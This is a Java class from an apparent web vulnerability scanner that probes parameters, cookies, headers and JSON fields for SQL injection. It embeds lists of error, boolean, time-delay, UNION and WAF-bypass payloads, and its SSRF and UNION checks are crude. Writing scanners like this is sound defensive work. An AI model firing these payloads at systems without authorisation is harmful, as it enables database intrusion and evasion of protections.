package com.virtualrift.webscanner.engine;

import com.virtualrift.common.model.Severity;
import com.virtualrift.common.model.VulnerabilityFinding;
import com.virtualrift.common.model.TenantId;

import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.UUID;
import java.util.regex.Pattern;

public class SqlInjectionDetector {

    private static final Set<String> INTERNAL_PATTERNS = Set.of(
            "localhost", "127.0.0.1", "0.0.0.0", "::1",
            "192.168.", "10.", "172.16.", "169.254."
    );

    private static final Pattern MYSQL_ERROR_PATTERN = Pattern.compile(
            "SQL syntax.*MySQL|Warning.*mysql_.*|MySqlException|valid MySQL result",
            Pattern.CASE_INSENSITIVE
    );

    private static final Pattern POSTGRESQL_ERROR_PATTERN = Pattern.compile(
            "PostgreSQL.*ERROR|Warning.*pg_.*|valid PostgreSQL result|Npgsql\\.",
            Pattern.CASE_INSENSITIVE
    );

    private static final Pattern SQLSERVER_ERROR_PATTERN = Pattern.compile(
            "Driver.*SQL.*Server|OLE DB.*SQL Server|SqlException|Unclosed quotation mark",
            Pattern.CASE_INSENSITIVE
    );

    private static final Pattern ORACLE_ERROR_PATTERN = Pattern.compile(
            "ORA-[0-9]+|Oracle error|Oracle.*Driver|Warning.*oci_.*",
            Pattern.CASE_INSENSITIVE
    );

    private static final Pattern SQLITE_ERROR_PATTERN = Pattern.compile(
            "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException",
            Pattern.CASE_INSENSITIVE
    );

    private static final Pattern JDBC_ERROR_PATTERN = Pattern.compile(
            "java\\.sql\\.SQLException|org\\.hibernate\\.Exception|javax\\.persistence\\.",
            Pattern.CASE_INSENSITIVE
    );

    private static final Pattern GENERAL_SQL_ERROR = Pattern.compile(
            "SQL syntax|syntax error|unclosed quotation|quoted string not properly terminated",
            Pattern.CASE_INSENSITIVE
    );

    private static final List<String> ERROR_PAYLOADS = List.of(
            "'",
            "'\"",
            "')",
            "\"",
            "1'",
            "1\"",
            "1')",
            "1\")"
    );

    private static final List<String> BOOLEAN_PAYLOADS = List.of(
            " AND 1=1",
            " AND 1=2",
            "' AND '1'='1",
            "' AND '1'='2",
            "\" AND \"1\"=\"1",
            "\" AND \"1\"=\"2",
            "*) AND 1=1--",
            "*) AND 1=2--",
            "') AND '1'='1'--",
            "') AND '1'='2'--"
    );

    private static final List<String> TIME_BASED_PAYLOADS = List.of(
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1; WAITFOR DELAY '00:00:05'--",
            "1); WAITFOR DELAY '00:00:05'--",
            "'; SELECT pg_sleep(5)--",
            "1' OR pg_sleep(5)='0'--"
    );

    private static final List<String> UNION_PAYLOADS = List.of(
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "\" UNION SELECT NULL--",
            "\" UNION SELECT NULL,NULL--"
    );

    private static final List<String> WAF_BYPASS_PAYLOADS = List.of(
            "'/*!00000AND*/ 1=1--",
            "'%20AND%201=1--",
            "'/*!AND*/1=1--",
            "' AnD 1=1--",
            "' AnD 1=2--",
            "1'/**/AND/**/1=1--",
            "1'/*!00000AND*/1=1--"
    );

    private final HttpClient httpClient;

    public SqlInjectionDetector(HttpClient httpClient) {
        this.httpClient = httpClient;
    }

    public List<VulnerabilityFinding> scan(String targetUrl, String paramName, String payload) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }
        if (payload == null || payload.isBlank()) {
            throw new IllegalArgumentException("payload cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);

        if (response.isPresent() && isErrorBasedSqli(response.get())) {
            findings.add(createFinding(
                    targetUrl,
                    Severity.HIGH,
                    "Error-based SQL Injection",
                    "Query parameter: " + paramName,
                    payload,
                    response.get()
            ));
        }

        return findings;
    }

    public List<VulnerabilityFinding> scan(String targetUrl, String paramName) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : ERROR_PAYLOADS) {
            Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);
            if (response.isPresent() && isErrorBasedSqli(response.get())) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.HIGH,
                        "Error-based SQL Injection",
                        "Query parameter: " + paramName,
                        payload,
                        response.get()
                ));
                break;
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanBoolean(String targetUrl, String paramName, String payload) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }
        if (payload == null || payload.isBlank()) {
            throw new IllegalArgumentException("payload cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);

        if (response.isPresent() && isErrorBasedSqli(response.get())) {
            findings.add(createFinding(
                    targetUrl,
                    Severity.CRITICAL,
                    "Boolean-based SQL Injection",
                    "Query parameter: " + paramName,
                    payload,
                    response.get()
            ));
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanBoolean(String targetUrl, String paramName) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        String baselineUrl = targetUrl + "?" + paramName + "=test";
        long baselineTime = httpClient.measureResponseTime(baselineUrl);

        for (int i = 0; i < BOOLEAN_PAYLOADS.size(); i += 2) {
            String truePayload = BOOLEAN_PAYLOADS.get(i);
            String falsePayload = BOOLEAN_PAYLOADS.get(i + 1);

            Optional<String> trueResponse = httpClient.sendRequest(targetUrl, paramName + "=" + truePayload);
            Optional<String> falseResponse = httpClient.sendRequest(targetUrl, paramName + "=" + falsePayload);

            if (trueResponse.isPresent() && falseResponse.isPresent()) {
                if (responsesDiffer(trueResponse.get(), falseResponse.get())) {
                    findings.add(createFinding(
                            targetUrl,
                            Severity.CRITICAL,
                            "Boolean-based SQL Injection",
                            "Query parameter: " + paramName,
                            truePayload,
                            trueResponse.get()
                    ));
                    break;
                }
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanTimeBased(String targetUrl, String paramName, String payload) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }
        if (payload == null || payload.isBlank()) {
            throw new IllegalArgumentException("payload cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        long startTime = System.currentTimeMillis();
        Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);
        long responseTime = System.currentTimeMillis() - startTime;

        if (responseTime >= 4500 && responseTime <= 10000) {
            findings.add(createFinding(
                    targetUrl,
                    Severity.CRITICAL,
                    "Time-based SQL Injection",
                    "Query parameter: " + paramName,
                    payload,
                    "Response time: " + responseTime + "ms"
            ));
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanTimeBased(String targetUrl, String paramName) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : TIME_BASED_PAYLOADS) {
            long startTime = System.currentTimeMillis();
            Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);
            long responseTime = System.currentTimeMillis() - startTime;

            if (responseTime >= 4500 && responseTime <= 10000) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.CRITICAL,
                        "Time-based SQL Injection",
                        "Query parameter: " + paramName,
                        payload,
                        "Response time: " + responseTime + "ms"
                ));
                break;
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanUnion(String targetUrl, String paramName) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : UNION_PAYLOADS) {
            Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);

            if (response.isPresent()) {
                String responseBody = response.get();
                if (isUnionBasedSqli(responseBody)) {
                    findings.add(createFinding(
                            targetUrl,
                            Severity.HIGH,
                            "Union-based SQL Injection",
                            "Query parameter: " + paramName,
                            payload,
                            responseBody
                    ));
                    break;
                }
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanSecondOrder(String targetUrl, String firstEndpoint,
                                                       String secondEndpoint, String paramName) {
        validateUrl(targetUrl);
        if (firstEndpoint == null || firstEndpoint.isBlank()) {
            throw new IllegalArgumentException("firstEndpoint cannot be blank");
        }
        if (secondEndpoint == null || secondEndpoint.isBlank()) {
            throw new IllegalArgumentException("secondEndpoint cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        String payload = "test' OR '1'='1";
        httpClient.sendRequest(targetUrl + firstEndpoint, paramName + "=" + payload);

        Optional<String> response = httpClient.getPage(targetUrl + secondEndpoint);

        if (response.isPresent() && isErrorBasedSqli(response.get())) {
            findings.add(createFinding(
                    targetUrl + secondEndpoint,
                    Severity.CRITICAL,
                    "Second-order SQL Injection",
                    "Stored at: " + firstEndpoint + ", reflected at: " + secondEndpoint,
                    payload,
                    response.get()
            ));
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanPathParam(String targetUrl, String paramName) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : ERROR_PAYLOADS) {
            String pathUrl = targetUrl.replace("{" + paramName + "}", payload);
            Optional<String> response = httpClient.sendRequest(pathUrl, "");

            if (response.isPresent() && isErrorBasedSqli(response.get())) {
                findings.add(createFinding(
                        pathUrl,
                        Severity.HIGH,
                        "SQL Injection in Path Parameter",
                        "Path parameter: " + paramName,
                        payload,
                        response.get()
                ));
                break;
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanCookie(String targetUrl, String cookieName) {
        validateUrl(targetUrl);
        if (cookieName == null || cookieName.isBlank()) {
            throw new IllegalArgumentException("cookieName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : ERROR_PAYLOADS) {
            Optional<String> response = httpClient.sendRequestWithCookie(
                    targetUrl, "", cookieName, payload
            );

            if (response.isPresent() && isErrorBasedSqli(response.get())) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.HIGH,
                        "SQL Injection in Cookie",
                        "Cookie: " + cookieName,
                        payload,
                        response.get()
                ));
                break;
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanJson(String targetUrl, String fieldName) {
        validateUrl(targetUrl);
        if (fieldName == null || fieldName.isBlank()) {
            throw new IllegalArgumentException("fieldName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : ERROR_PAYLOADS) {
            String jsonPayload = "{\"" + fieldName + "\": \"" + payload + "\"}";
            Optional<String> response = httpClient.sendJson(targetUrl, jsonPayload);

            if (response.isPresent() && isErrorBasedSqli(response.get())) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.HIGH,
                        "SQL Injection in JSON Body",
                        "JSON field: " + fieldName,
                        payload,
                        response.get()
                ));
                break;
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanHeader(String targetUrl, String headerName) {
        validateUrl(targetUrl);
        if (headerName == null || headerName.isBlank()) {
            throw new IllegalArgumentException("headerName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : ERROR_PAYLOADS) {
            Optional<String> response = httpClient.sendRequestWithHeader(
                    targetUrl, "", headerName, payload
            );

            if (response.isPresent() && isErrorBasedSqli(response.get())) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.HIGH,
                        "SQL Injection in Header",
                        "Header: " + headerName,
                        payload,
                        response.get()
                ));
                break;
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanWafBypass(String targetUrl, String paramName) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        for (String payload : WAF_BYPASS_PAYLOADS) {
            Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);

            if (response.isPresent() && isErrorBasedSqli(response.get())) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.CRITICAL,
                        "SQL Injection with WAF Bypass",
                        "Query parameter: " + paramName,
                        payload,
                        response.get()
                ));
                break;
            }
        }

        return findings;
    }


    public List<VulnerabilityFinding> scanUnion(String targetUrl, String paramName, String payload) {
        validateUrl(targetUrl);
        if (paramName == null || paramName.isBlank()) {
            throw new IllegalArgumentException("paramName cannot be blank");
        }
        if (payload == null || payload.isBlank()) {
            throw new IllegalArgumentException("payload cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        Optional<String> response = httpClient.sendRequest(targetUrl, paramName + "=" + payload);

        if (response.isPresent()) {
            String responseBody = response.get();
            if (isUnionBasedSqli(responseBody)) {
                findings.add(createFinding(
                        targetUrl,
                        Severity.HIGH,
                        "Union-based SQL Injection",
                        "Query parameter: " + paramName,
                        payload,
                        responseBody
                ));
            }
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanCookie(String targetUrl, String cookieName, String payload) {
        validateUrl(targetUrl);
        if (cookieName == null || cookieName.isBlank()) {
            throw new IllegalArgumentException("cookieName cannot be blank");
        }
        if (payload == null || payload.isBlank()) {
            throw new IllegalArgumentException("payload cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        Optional<String> response = httpClient.sendRequestWithCookie(targetUrl, payload);

        if (response.isPresent() && isErrorBasedSqli(response.get())) {
            findings.add(createFinding(
                    targetUrl,
                    Severity.HIGH,
                    "SQL Injection in Cookie",
                    "Cookie: " + cookieName,
                    payload,
                    response.get()
            ));
        }

        return findings;
    }

    public List<VulnerabilityFinding> scanHeader(String targetUrl, String headerName, String payload) {
        validateUrl(targetUrl);
        if (headerName == null || headerName.isBlank()) {
            throw new IllegalArgumentException("headerName cannot be blank");
        }
        if (payload == null || payload.isBlank()) {
            throw new IllegalArgumentException("payload cannot be blank");
        }

        List<VulnerabilityFinding> findings = new ArrayList<>();

        Optional<String> response = httpClient.sendRequestWithHeader(targetUrl, payload);

        if (response.isPresent() && isErrorBasedSqli(response.get())) {
            findings.add(createFinding(
                    targetUrl,
                    Severity.HIGH,
                    "SQL Injection in Header",
                    "Header: " + headerName,
                    payload,
                    response.get()
            ));
        }

        return findings;
    }
    private boolean isErrorBasedSqli(String response) {
        return MYSQL_ERROR_PATTERN.matcher(response).find()
                || POSTGRESQL_ERROR_PATTERN.matcher(response).find()
                || SQLSERVER_ERROR_PATTERN.matcher(response).find()
                || ORACLE_ERROR_PATTERN.matcher(response).find()
                || SQLITE_ERROR_PATTERN.matcher(response).find()
                || JDBC_ERROR_PATTERN.matcher(response).find()
                || GENERAL_SQL_ERROR.matcher(response).find();
    }

    private boolean isUnionBasedSqli(String response) {
        return response.contains("NULL") ||
                response.contains("Warning") ||
                response.contains("Syntax") ||
                response.contains("mysql_fetch") ||
                response.contains("ORA-") ||
                response.contains("PostgreSQL");
    }

    private boolean responsesDiffer(String response1, String response2) {
        if (response1 == null || response2 == null) {
            return false;
        }

        int length1 = response1.length();
        int length2 = response2.length();

        if (Math.abs(length1 - length2) > 100) {
            return true;
        }

        String normalized1 = response1.toLowerCase().replaceAll("\\s+", "");
        String normalized2 = response2.toLowerCase().replaceAll("\\s+", "");

        return !normalized1.equals(normalized2);
    }

    private VulnerabilityFinding createFinding(String url, Severity severity, String title,
                                               String location, String evidence, String response) {
        String fullEvidence = "Payload: " + evidence + "\nResponse: " +
                (response.length() > 500 ? response.substring(0, 500) + "..." : response);

        return VulnerabilityFinding.of(
                UUID.randomUUID(),
                UUID.randomUUID(),
                null,
                title,
                severity,
                "SQL_INJECTION",
                location + " at " + url,
                fullEvidence,
                Instant.now()
        );
    }

    private void validateUrl(String url) {
        if (url == null || url.isBlank()) {
            throw new IllegalArgumentException("URL cannot be null or blank");
        }

        String lowerUrl = url.toLowerCase();

        for (String pattern : INTERNAL_PATTERNS) {
            if (lowerUrl.contains(pattern)) {
                throw new IllegalArgumentException(
                        "SSRF protection: Cannot scan internal addresses (" + pattern + ")"
                );
            }
        }

        if (!lowerUrl.startsWith("http://") && !lowerUrl.startsWith("https://")) {
            throw new IllegalArgumentException("URL must start with http:// or https://");
        }
    }
}
